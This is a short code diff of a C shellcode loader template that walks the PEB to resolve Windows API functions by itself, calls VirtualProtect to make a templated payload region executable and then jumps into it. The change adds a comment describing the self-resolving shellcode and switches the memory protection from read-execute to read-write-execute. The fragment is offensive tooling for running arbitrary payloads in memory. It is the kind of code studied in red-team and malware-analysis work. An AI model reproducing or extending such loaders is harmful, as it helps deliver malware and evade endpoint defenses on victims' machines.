@@ -2,8 +2,11 @@
 #include "peb_lookup.h"
 
 
-//extern char *supermega_payload;
 char *supermega_payload;
+
+/* peb_walk
+   Standard shellcode which will resolve IAT by itself with a peb_walk
+*/
 
 int main()
 {
@@ -107,7 +110,8 @@ int main()
 			_In_ DWORD  flNewProtect,
 			_Out_ PDWORD lpflOldProtect)) _GetProcAddress((HMODULE)base, VirtualProtect_str);
 	if (_VirtualProtect == NULL) return 4;
-	_VirtualProtect(dest, {{PAYLOAD_LEN}}, 0x20, &result); // rx
+//	_VirtualProtect(dest, {{PAYLOAD_LEN}}, 0x20, &result); // rx
+	_VirtualProtect(dest, {{PAYLOAD_LEN}}, 0x40, &result); // rwx
 
     // Execute *dest
     (*(void(*)())(dest))();
